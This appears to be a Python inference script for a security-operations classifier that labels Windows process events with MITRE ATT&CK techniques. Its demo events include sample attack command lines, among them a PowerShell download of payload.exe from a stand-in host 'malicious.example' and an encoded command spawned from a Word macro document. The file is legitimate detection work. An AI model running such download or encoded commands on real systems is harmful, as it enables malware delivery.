"""
SmartSOC Windows-APT Model B v4.1
Production-style inference pipeline

Loads:
    - calibrated One-vs-Rest Logistic Regression
    - OneHotEncoder
    - StandardScaler
    - TF-IDF vectorizer
    - MultiLabelBinarizer
    - feature schema
    - technique-specific thresholds

Input:
    Structured Windows event dictionary

Output:
    - predicted MITRE ATT&CK techniques
    - confidence
    - technique threshold
    - top probability scores
    - feature-alignment validation

This script performs inference only.
It does NOT perform automated containment or endpoint isolation.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any, Dict, List

import joblib
import numpy as np
import pandas as pd
from scipy import sparse


# ============================================================================
# PATHS
# ============================================================================

BASE_DIR = Path(__file__).resolve().parents[1]

MODEL_DIR = (
    BASE_DIR
    / "models"
    / "windows_apt_v4_1"
    / "calibrated"
)

MODEL_PATH = MODEL_DIR / "multilabel_logistic_v4_1_calibrated.joblib"
ENCODER_PATH = MODEL_DIR / "structured_encoder_v4_1_calibrated.joblib"
SCALER_PATH = MODEL_DIR / "numerical_scaler_v4_1_calibrated.joblib"
TFIDF_PATH = MODEL_DIR / "tfidf_vectorizer_v4_1_calibrated.joblib"
LABEL_ENCODER_PATH = (
    MODEL_DIR / "multilabel_encoder_v4_1_calibrated.joblib"
)
SCHEMA_PATH = (
    MODEL_DIR / "feature_schema_v4_1_calibrated.json"
)
THRESHOLD_PATH = (
    MODEL_DIR / "technique_thresholds_v4_1.json"
)


# ============================================================================
# UTILITIES
# ============================================================================

def require_file(path: Path) -> None:
    if not path.exists():
        raise FileNotFoundError(
            f"Required artifact not found:\n{path}"
        )

    print(f"[OK] {path}")


def normalize_text(value: Any) -> str:
    if value is None:
        return ""

    if isinstance(value, float) and np.isnan(value):
        return ""

    text = str(value)

    text = text.lower()
    text = re.sub(r"\s+", " ", text)
    text = text.strip()

    return text


def safe_int(value: Any, default: int = 0) -> int:
    try:
        if value is None:
            return default

        if isinstance(value, float) and np.isnan(value):
            return default

        return int(float(value))

    except Exception:
        return default


def safe_float(value: Any, default: float = 0.0) -> float:
    try:
        if value is None:
            return default

        if isinstance(value, float) and np.isnan(value):
            return default

        return float(value)

    except Exception:
        return default


def missing_string(value: Any) -> str:
    value = normalize_text(value)

    if not value:
        return "<missing>"

    return value


# ============================================================================
# LOAD ARTIFACTS
# ============================================================================

def load_artifacts():
    print()
    print("=" * 79)
    print("SmartSOC Windows-APT Model B v4.1 - Inference")
    print("=" * 79)

    print()
    print("Checking required artifacts...")

    for path in [
        MODEL_PATH,
        ENCODER_PATH,
        SCALER_PATH,
        TFIDF_PATH,
        LABEL_ENCODER_PATH,
        SCHEMA_PATH,
        THRESHOLD_PATH,
    ]:
        require_file(path)

    print()
    print("Loading artifacts...")

    model = joblib.load(MODEL_PATH)
    encoder = joblib.load(ENCODER_PATH)
    scaler = joblib.load(SCALER_PATH)
    tfidf = joblib.load(TFIDF_PATH)
    label_encoder = joblib.load(LABEL_ENCODER_PATH)

    with open(SCHEMA_PATH, "r", encoding="utf-8") as f:
        schema = json.load(f)

    with open(THRESHOLD_PATH, "r", encoding="utf-8") as f:
        threshold_data = json.load(f)

    thresholds = threshold_data.get(
        "thresholds",
        {}
    )

    print("Model loaded.")
    print("Structured encoder loaded.")
    print("Numerical scaler loaded.")
    print("TF-IDF loaded.")
    print("Label encoder loaded.")
    print("Feature schema loaded.")
    print("Thresholds loaded.")

    return (
        model,
        encoder,
        scaler,
        tfidf,
        label_encoder,
        schema,
        thresholds,
    )


# ============================================================================
# STRUCTURED FEATURE PREPARATION
# ============================================================================

def build_structured_dataframe(
    event: Dict[str, Any],
    schema: Dict[str, Any],
) -> pd.DataFrame:

    categorical_columns = schema.get(
        "categorical_columns",
        [
            "process_name",
            "parent_process_name",
            "process_extension",
            "parent_extension",
        ],
    )

    numerical_columns = schema.get(
        "numerical_columns",
        [],
    )

    row: Dict[str, Any] = {}

    # ------------------------------------------------------------------------
    # CATEGORICAL FEATURES
    # ------------------------------------------------------------------------

    for column in categorical_columns:
        row[column] = missing_string(
            event.get(column, "")
        )

    # ------------------------------------------------------------------------
    # NUMERICAL FEATURES
    # ------------------------------------------------------------------------

    for column in numerical_columns:

        value = event.get(column, 0)

        row[column] = safe_float(
            value,
            default=0.0,
        )

    return pd.DataFrame(
        [row],
        columns=categorical_columns + numerical_columns,
    )


# ============================================================================
# BEHAVIOR TEXT
# ============================================================================

def build_behavior_text(
    event: Dict[str, Any],
    schema: Dict[str, Any],
) -> str:

    text_fields = [
        "event_id",
        "process_name",
        "parent_process_name",
        "command_line",
        "parent_command_line",
        "user",
        "uses_powershell",
        "uses_cmd",
        "uses_net",
        "uses_whoami",
        "uses_schtasks",
        "uses_reg",
        "uses_rundll32",
        "uses_wmic",
        "uses_certutil",
        "uses_bitsadmin",
        "uses_ipconfig",
        "uses_netstat",
        "uses_tasklist",
        "uses_sc",
        "uses_mshta",
        "uses_regsvr32",
        "uses_cscript",
        "uses_wscript",
        "uses_wevtutil",
        "uses_vssadmin",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
        "administrative_powershell_context",
        "strong_behavior_signal",
    ]

    parts: List[str] = []

    for field in text_fields:

        value = event.get(field)

        if value is None:
            continue

        if isinstance(value, float) and np.isnan(value):
            continue

        text = normalize_text(value)

        if not text:
            continue

        parts.append(
            f"{field}={text}"
        )

    return " ".join(parts)


# ============================================================================
# HYBRID FEATURE CONSTRUCTION
# ============================================================================

def build_hybrid_features(
    event: Dict[str, Any],
    schema: Dict[str, Any],
    encoder,
    scaler,
    tfidf,
):

    categorical_columns = schema.get(
        "categorical_columns",
        [],
    )

    numerical_columns = schema.get(
        "numerical_columns",
        [],
    )

    structured_df = build_structured_dataframe(
        event,
        schema,
    )

    categorical_df = structured_df[
        categorical_columns
    ]

    numerical_df = structured_df[
        numerical_columns
    ]

    # ------------------------------------------------------------------------
    # ONE-HOT ENCODING
    # ------------------------------------------------------------------------

    categorical_matrix = encoder.transform(
        categorical_df
    )

    if not sparse.issparse(categorical_matrix):
        categorical_matrix = sparse.csr_matrix(
            categorical_matrix
        )

    # ------------------------------------------------------------------------
    # NUMERICAL SCALING
    # ------------------------------------------------------------------------

    numerical_matrix = scaler.transform(
        numerical_df.to_numpy(
            dtype=np.float64
        )
    )

    numerical_matrix = sparse.csr_matrix(
        numerical_matrix
    )

    # ------------------------------------------------------------------------
    # STRUCTURED MATRIX
    # ------------------------------------------------------------------------

    structured_matrix = sparse.hstack(
        [
            categorical_matrix,
            numerical_matrix,
        ],
        format="csr",
    )

    # ------------------------------------------------------------------------
    # TF-IDF
    # ------------------------------------------------------------------------

    behavior_text = build_behavior_text(
        event,
        schema,
    )

    text_matrix = tfidf.transform(
        [behavior_text]
    )

    # ------------------------------------------------------------------------
    # HYBRID MATRIX
    # ------------------------------------------------------------------------

    hybrid_matrix = sparse.hstack(
        [
            structured_matrix,
            text_matrix,
        ],
        format="csr",
    )

    return hybrid_matrix, behavior_text


# ============================================================================
# THRESHOLD HANDLING
# ============================================================================

def get_threshold(
    technique: str,
    thresholds: Dict[str, Any],
) -> float:

    value = thresholds.get(
        technique,
        0.5,
    )

    try:
        value = float(value)
    except Exception:
        value = 0.5

    return value


# ============================================================================
# PREDICTION
# ============================================================================

def predict_event(
    event: Dict[str, Any],
    artifacts,
    top_k: int = 10,
):

    (
        model,
        encoder,
        scaler,
        tfidf,
        label_encoder,
        schema,
        thresholds,
    ) = artifacts

    hybrid_matrix, behavior_text = (
        build_hybrid_features(
            event,
            schema,
            encoder,
            scaler,
            tfidf,
        )
    )

    expected_features = schema.get(
        "final_feature_count"
    )

    actual_features = hybrid_matrix.shape[1]

    print()
    print(
        f"Generated hybrid feature count: "
        f"{actual_features}"
    )

    if expected_features is not None:
        if actual_features != int(
            expected_features
        ):
            raise ValueError(
                "Feature dimension mismatch.\n"
                f"Expected: {expected_features}\n"
                f"Generated: {actual_features}"
            )

    print()
    print("Behavior text:")
    print(behavior_text)

    # ------------------------------------------------------------------------
    # PROBABILITY PREDICTION
    # ------------------------------------------------------------------------

    probabilities = model.predict_proba(
        hybrid_matrix
    )

    probabilities = np.asarray(
        probabilities
    )

    if probabilities.ndim == 1:
        probabilities = probabilities.reshape(
            1,
            -1,
        )

    probabilities = probabilities[0]

    classes = list(
        label_encoder.classes_
    )

    if len(classes) != len(
        probabilities
    ):
        raise ValueError(
            "MITRE class count does not match "
            "probability count."
        )

    # ------------------------------------------------------------------------
    # SORT PROBABILITIES
    # ------------------------------------------------------------------------

    ranking = np.argsort(
        probabilities
    )[::-1]

    # ------------------------------------------------------------------------
    # APPLY TECHNIQUE-SPECIFIC THRESHOLDS
    # ------------------------------------------------------------------------

    predictions = []

    for index in ranking:

        technique = classes[index]

        confidence = float(
            probabilities[index]
        )

        threshold = get_threshold(
            technique,
            thresholds,
        )

        if confidence >= threshold:

            predictions.append(
                {
                    "technique": technique,
                    "confidence": confidence,
                    "threshold": threshold,
                }
            )

    # ------------------------------------------------------------------------
    # FALLBACK
    # ------------------------------------------------------------------------

    fallback_used = False

    if not predictions:

        best_index = int(
            ranking[0]
        )

        technique = classes[
            best_index
        ]

        confidence = float(
            probabilities[best_index]
        )

        threshold = get_threshold(
            technique,
            thresholds,
        )

        predictions.append(
            {
                "technique": technique,
                "confidence": confidence,
                "threshold": threshold,
                "fallback": True,
            }
        )

        fallback_used = True

    # ------------------------------------------------------------------------
    # TOP SCORES
    # ------------------------------------------------------------------------

    top_scores = []

    for index in ranking[:top_k]:

        technique = classes[index]

        confidence = float(
            probabilities[index]
        )

        threshold = get_threshold(
            technique,
            thresholds,
        )

        top_scores.append(
            {
                "technique": technique,
                "confidence": confidence,
                "threshold": threshold,
            }
        )

    # ------------------------------------------------------------------------
    # OUTPUT
    # ------------------------------------------------------------------------

    return {
        "predictions": predictions,
        "top_scores": top_scores,
        "fallback_used": fallback_used,
        "behavior_text": behavior_text,
        "feature_count": actual_features,
    }


# ============================================================================
# DISPLAY
# ============================================================================

def display_result(
    result: Dict[str, Any]
):

    print()
    print("Predicted MITRE techniques:")

    for prediction in result[
        "predictions"
    ]:

        technique = prediction[
            "technique"
        ]

        confidence = prediction[
            "confidence"
        ]

        threshold = prediction[
            "threshold"
        ]

        fallback = prediction.get(
            "fallback",
            False,
        )

        suffix = (
            " [FALLBACK]"
            if fallback
            else ""
        )

        print(
            f"{technique:<12} | "
            f"confidence={confidence:.4f} | "
            f"threshold={threshold:.4f}"
            f"{suffix}"
        )

    print()
    print("Top probability scores:")

    for item in result[
        "top_scores"
    ]:

        print(
            f"{item['technique']:<12} "
            f"{item['confidence']:.4f} "
            f"(threshold="
            f"{item['threshold']:.4f})"
        )


# ============================================================================
# DEMO EVENTS
# ============================================================================

def demo_events():

    return [

        {
            "event_id": 1,
            "process_name": "powershell.exe",
            "parent_process_name": "explorer.exe",
            "process_extension": "exe",
            "parent_extension": "exe",
            "command_line": (
                "powershell.exe Get-Service"
            ),
            "parent_command_line": (
                "explorer.exe"
            ),
            "user": "administrator",
            "uses_powershell": 1,
            "administrative_powershell_context": 1,
        },

        {
            "event_id": 1,
            "process_name": "powershell.exe",
            "parent_process_name": "winword.exe",
            "process_extension": "exe",
            "parent_extension": "exe",
            "command_line": (
                "powershell.exe "
                "-EncodedCommand "
                "SQBFAFgA"
            ),
            "parent_command_line": (
                "winword.exe suspicious.docm"
            ),
            "user": "administrator",
            "uses_powershell": 1,
            "has_encoded_command": 1,
            "has_obfuscation_hint": 1,
            "strong_behavior_signal": 1,
        },

        {
            "event_id": 1,
            "process_name": "powershell.exe",
            "parent_process_name": "cmd.exe",
            "process_extension": "exe",
            "parent_extension": "exe",
            "command_line": (
                "powershell.exe "
                "Invoke-WebRequest "
                "https://malicious.example/"
                "payload.exe "
                "-OutFile "
                "C:\\Temp\\payload.exe"
            ),
            "parent_command_line": (
                "cmd.exe"
            ),
            "user": "administrator",
            "uses_powershell": 1,
            "uses_cmd": 1,
            "has_download_behavior": 1,
            "has_remote_execution_hint": 1,
            "strong_behavior_signal": 1,
        },

        {
            "event_id": 11,
            "process_name": "unknown.exe",
            "parent_process_name": "cmd.exe",
            "process_extension": "exe",
            "parent_extension": "exe",
            "command_line": (
                "unknown.exe "
                "mass file modification "
                "and destruction"
            ),
            "parent_command_line": (
                "cmd.exe"
            ),
            "user": "administrator",
            "uses_cmd": 1,
            "has_file_deletion": 1,
            "has_obfuscation_hint": 1,
            "strong_behavior_signal": 1,
        },

    ]


# ============================================================================
# MAIN
# ============================================================================

def main():

    artifacts = load_artifacts()

    (
        model,
        encoder,
        scaler,
        tfidf,
        label_encoder,
        schema,
        thresholds,
    ) = artifacts

    print()
    print("Model information:")
    print(
        "Model type        :",
        type(model).__name__,
    )

    print(
        "MITRE techniques  :",
        len(label_encoder.classes_),
    )

    print(
        "TF-IDF vocabulary :",
        len(tfidf.vocabulary_),
    )

    print(
        "Expected features :",
        schema.get(
            "final_feature_count",
            "unknown",
        ),
    )

    print()
    print("Categorical features:")

    for column in schema.get(
        "categorical_columns",
        [],
    ):
        print(f"- {column}")

    print()
    print(
        "Numerical feature count:",
        len(
            schema.get(
                "numerical_columns",
                [],
            )
        ),
    )

    # ------------------------------------------------------------------------
    # DIMENSION CHECK
    # ------------------------------------------------------------------------

    categorical_count = len(
        schema.get(
            "categorical_columns",
            [],
        )
    )

    numerical_count = len(
        schema.get(
            "numerical_columns",
            [],
        )
    )

    encoded_count = (
        encoder.transform(
            pd.DataFrame(
                [
                    {
                        column: "<missing>"
                        for column in schema.get(
                            "categorical_columns",
                            [],
                        )
                    }
                ]
            )
        ).shape[1]
    )

    tfidf_count = len(
        tfidf.vocabulary_
    )

    calculated_features = (
        encoded_count
        + numerical_count
        + tfidf_count
    )

    print()
    print(
        "Categorical input features :",
        categorical_count,
    )

    print(
        "Categorical encoded features:",
        encoded_count,
    )

    print(
        "Numerical features          :",
        numerical_count,
    )

    print(
        "TF-IDF features             :",
        tfidf_count,
    )

    print(
        "Calculated hybrid features  :",
        calculated_features,
    )

    print(
        "Schema expected features    :",
        schema.get(
            "final_feature_count"
        ),
    )

    if hasattr(
        model,
        "n_features_in_"
    ):
        print(
            "Model input features        :",
            model.n_features_in_,
        )

    if (
        calculated_features
        != int(
            schema.get(
                "final_feature_count",
                calculated_features,
            )
        )
    ):
        raise ValueError(
            "Calculated feature count does "
            "not match schema."
        )

    if hasattr(
        model,
        "n_features_in_"
    ):
        if calculated_features != (
            model.n_features_in_
        ):
            raise ValueError(
                "Calculated feature count does "
                "not match model input."
            )

    print()
    print(
        "[OK] Artifact dimensions "
        "are consistent."
    )

    # ------------------------------------------------------------------------
    # THRESHOLD INFORMATION
    # ------------------------------------------------------------------------

    threshold_values = []

    for technique in label_encoder.classes_:

        threshold = get_threshold(
            technique,
            thresholds,
        )

        threshold_values.append(
            threshold
        )

    print()
    print(
        "Technique count :",
        len(threshold_values),
    )

    print(
        "Default threshold:",
        "0.5000",
    )

    print(
        "Minimum threshold:",
        f"{min(threshold_values):.4f}",
    )

    print(
        "Maximum threshold:",
        f"{max(threshold_values):.4f}",
    )

    print(
        "Unique thresholds:",
        sorted(
            set(
                round(
                    x,
                    4,
                )
                for x in threshold_values
            )
        ),
    )

    print()
    print(
        "## Technique-specific thresholds"
    )

    for technique in label_encoder.classes_:

        threshold = get_threshold(
            technique,
            thresholds,
        )

        print(
            f"{technique:<12} "
            f"{threshold:.4f}"
        )

    # ------------------------------------------------------------------------
    # RUN DEMOS
    # ------------------------------------------------------------------------

    for event in demo_events():

        print()
        print(
            "=" * 79
        )

        try:

            result = predict_event(
                event,
                artifacts,
                top_k=10,
            )

            display_result(
                result
            )

        except Exception as exc:

            print()
            print(
                "INFERENCE ERROR:"
            )

            print(
                type(exc).__name__,
                ":",
                str(exc),
            )

            raise

    print()
    print(
        "=" * 79
    )

    print(
        "SmartSOC Windows-APT "
        "Model B v4.1 Inference Test Complete"
    )


if __name__ == "__main__":
    main()